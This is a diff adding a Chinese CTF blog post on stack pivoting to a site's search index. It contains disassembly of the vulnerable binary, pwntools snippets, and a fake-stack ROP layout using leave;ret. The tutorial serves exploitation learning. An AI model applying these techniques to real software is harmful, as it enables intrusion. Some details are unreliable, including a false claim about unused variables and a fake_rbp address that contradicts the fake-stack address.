@@ -7906,4 +7906,85 @@ API网关的权限检查
         <tag>pdsctf2025</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2026-4-14-栈迁移</title>
+    <url>/2026/04/14/2026-4-14-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
+    <content><![CDATA[<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>栈迁移题目分析</p>
+<p>第一步，为什么要栈迁移？</p>
+<p>栈迁移因为可写缓冲区也就是buff 不足以支持完整的RPO链</p>
+<p>我们只能将RPO链放到<code> .bss</code></p>
+<ul>
+<li><code> .bss</code>解释：<ul>
+<li><code>.bss</code>是内存上一块内存区域，它的存在是编译器预留了存放未初始化的全局变量&#x2F;静态变量的位置</li>
+<li>这也是我们平时写代码，为什么存在了未使用的变量会导致报错的原因。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; __int64 __fastcall main(int, char **, char **)</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -80h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">mov     rax, cs:stdin</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stdout</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stderr</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">lea     rax, s          ; &quot;Are you the king of stack migrate?&quot;</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 90h        ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">lea     rax, aGoodLuck  ; &quot;Good luck.&quot;</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 40114B</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">_text ends</span><br></pre></td></tr></table></figure>
+
+<p>这段汇编代码中，你可能认为<code>buf</code>是<code>.bss</code>地址，这是个常见的错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">mov     rax, cs:stdin</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br></pre></td></tr></table></figure>
+
+<p><code>buf</code> 没有被程序主动初始化，既没有清零，也没有赋值，但并不属于.bss，因为其在栈上。</p>
+<p>pwntools工具可以直接寻找，不需要手动找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.bss()))</span><br></pre></td></tr></table></figure>
+
+<p>output:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) ┌──(.venv)(cure㉿LAPTOP-CMAM5D0J)-[~/CTF/pwn/19]</span><br><span class="line">└─$ /home/cure/miniconda3/bin/python /home/cure/CTF/pwn/19/exp2.py</span><br><span class="line">[*] <span class="string">&#x27;/home/cure/CTF/pwn/19/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">0x404020</span><br></pre></td></tr></table></figure>
+
+<p><code>.bss</code>&#x3D;0x404020</p>
+<p>然后我们即可开始第二步，伪造假栈，迁移原栈</p>
+<p>首先我们必须知道 <code>fake_rpb</code> 也就是假栈的地址，是交给<code>leave; ret </code> 去执行的</p>
+<p>我们需要让<code>rsp</code>精确落到伪造好的假栈开头</p>
+<p>行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave        ; mov rsp, rbp ; pop rbp</span><br><span class="line">ret          ; pop rip</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">leave_ret = <span class="number">0x4011c8</span> </span><br><span class="line">fake_stack = <span class="number">0x404800</span></span><br></pre></td></tr></table></figure>
+
+<p>假栈内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_stack  = p64(<span class="number">0</span>)              <span class="comment"># 新 rbp</span></span><br><span class="line">fake_stack += p64(<span class="number">0x401146</span>)       <span class="comment"># pop rdi ; ret</span></span><br><span class="line">fake_stack += p64(<span class="number">0x404900</span>)       <span class="comment"># 参数</span></span><br><span class="line">fake_stack += p64(<span class="number">0x401030</span>)       <span class="comment"># puts@plt</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_rbp = fake_stack_addr = <span class="number">0x401146</span></span><br></pre></td></tr></table></figure>
+
+<p>ruler &#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[fake_rbp + 0x00] = new_rbp</span><br><span class="line">[fake_rbp + 0x08] = 第一个 gadget / 返回地址</span><br><span class="line">[fake_rbp + 0x10] = 后续参数或 gadget	</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<hr>
+<h3 id="利用流程总结"><a href="#利用流程总结" class="headerlink" title="利用流程总结"></a>利用流程总结</h3><p>本题的整体思路如下：</p>
+<h4 id="1-确认栈空间不足"><a href="#1-确认栈空间不足" class="headerlink" title="1. 确认栈空间不足"></a>1. 确认栈空间不足</h4><p>当前 <code>buf</code> 只有 <code>0x80</code>，不足以支撑完整 ROP 链。</p>
+<h4 id="2-寻找可写区域"><a href="#2-寻找可写区域" class="headerlink" title="2. 寻找可写区域"></a>2. 寻找可写区域</h4><p>使用 <code>.bss</code> 作为假栈区域。</p>
+<h4 id="3-找到-bss-地址"><a href="#3-找到-bss-地址" class="headerlink" title="3. 找到 .bss 地址"></a>3. 找到 <code>.bss</code> 地址</h4><p>通过 <code>elf.bss()</code> 获取 <code>.bss</code> 起始地址，再偏移一段距离作为真正使用的假栈区域。</p>
+<h4 id="4-伪造假栈内容"><a href="#4-伪造假栈内容" class="headerlink" title="4. 伪造假栈内容"></a>4. 伪造假栈内容</h4><p>在 <code>.bss</code> 中布置：</p>
+<ul>
+<li>新 rbp</li>
+<li>第一个 gadget</li>
+<li>后续参数</li>
+<li>后续 ROP 链</li>
+</ul>
+<h4 id="5-控制-saved-rbp"><a href="#5-控制-saved-rbp" class="headerlink" title="5. 控制 saved rbp"></a>5. 控制 <code>saved rbp</code></h4><p>把它改成 <code>fake_rbp</code></p>
+<h4 id="6-控制返回地址"><a href="#6-控制返回地址" class="headerlink" title="6. 控制返回地址"></a>6. 控制返回地址</h4><p>把返回地址改成 <code>leave; ret</code></p>
+<h4 id="7-执行栈迁移"><a href="#7-执行栈迁移" class="headerlink" title="7. 执行栈迁移"></a>7. 执行栈迁移</h4><p>当 <code>leave; ret</code> 执行后，<code>rsp</code> 就会落到 <code>.bss</code> 上，开始从假栈继续执行。</p>
+<hr>
+<h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h3><p>栈迁移的本质就是：</p>
+<p><strong>当前栈空间不够用，于是把 <code>rsp</code> 迁移到 <code>.bss</code> 这种更大、可写的区域中，再从那里继续执行 ROP 链。</strong></p>
+<p>而 <code>fake_rbp</code> 的本质，就是：</p>
+<p><strong>你希望下一次 <code>leave</code> 执行时，<code>rsp</code> 落到的那个地址。</strong></p>
+<p>最近要去准备开发类的比赛了暂放CTF，预留AI补充的思路过程暂时收尾此博客。</p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+        <tag>KingOfStackMigrate</tag>
+      </tags>
+  </entry>
 </search>
